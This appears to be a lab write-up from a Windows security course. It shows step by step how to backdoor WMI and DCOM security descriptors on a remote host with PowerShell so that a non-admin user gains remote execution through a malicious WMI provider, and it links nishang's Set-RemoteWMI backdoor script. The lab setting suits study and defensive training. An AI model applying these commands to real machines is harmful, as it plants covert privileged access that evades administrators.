## Hands On 10: Security Descriptors

#### Use EvilNetConnection provider discussed earlier and modify Security Descriptor of its namespace to achieve command execution using a non-admin user
This solution walked through the Set-RemoteWMI script to better understand how it works and the commands being used to modify the security descriptors

- [EvilNetConnectionWMIProvider](https://github.com/jaredcatkinson/EvilNetConnectionWMIProvider)
- [Set-RemoteWMI](https://raw.githubusercontent.com/samratashok/nishang/master/Backdoors/Set-RemoteWMI.ps1)

##### user3 is an administrator on Win7x64 host.  Want to allow user2 execution privilege for everything under root\cimv2 namepsace on Win7x64
```
$SID = (New-Object System.Security.Principal.NTAccount("home.local\user2")).Translate([System.Security.Principal.SecurityIdentifier]).value
```

##### Create ACL to allow user2 execution privilege for everything under root\cimv2 namespace
```
$SDDL = "A;CI;CCDCLCSWRPWPRCWD;;;$SID"
$DCOMSDDL = "A;;CCDCLCSWRP;;;$SID"
```

##### Collect information from remote machine
```
$RegProvider = Get-WmiObject -Namespace root\default -Class StdRegProv -List -ComputerName win7x64 -Credential home.local\user3
$Security = Get-WmiObject -Namespace root\cimv2 -Class __SystemSecurity -List -ComputerName win7x64 -Credential home.local\user3
$Converter = Get-WmiObject -Namespace root\cimv2 -Class Win32_SecurityDescriptorHelper -List -ComputerName win7x64 -Credential home.local\user3
```

##### Create new SDDL for WMI namespace and DCOM.  Allow user2 remote execution 
```
$DCOM = $RegProvider.GetBinaryValue(2147483650,"Software\Microsoft\Ole","MachineLaunchRestriction").uValue
$binarySD = @($null)
$result = $Security.PSBase.InvokeMethod("GetSD",$binarySD)
$outsddl = $converter.BinarySDToSDDL($binarySD[0])
$outDCOMSDDL = $converter.BinarySDToSDDL($DCOM)
$newSDDL = $outsddl.SDDL += "(" + $SDDL + ")"
$newDCOMSDDL = $outDCOMSDDL.SDDL += "(" + $DCOMSDDL + ")"
$WMIbinarySD = $converter.SDDLToBinarySD($newSDDL)
$WMIconvertedPermissions = ,$WMIbinarySD.BinarySD
$DCOMbinarySD = $converter.SDDLToBinarySD($newDCOMSDDL)
$DCOMconvertedPermissions = ,$DCOMbinarySD.BinarySD
$result = $Security.PsBase.InvokeMethod("SetSD",$WMIconvertedPermissions)
$result = $RegProvider.SetBinaryValue(2147483650,"Software\Microsoft\Ole","MachineLaunchRestriction", $DCOMbinarySD.binarySD)
```

##### user2 should not have execution privileges for nampesaces under root\cimv2 namepsace on remote host Win7x64
```
Get-WMIObject Win32_NetConnection -Computer Win7x64 -Credential home.local\user2
```
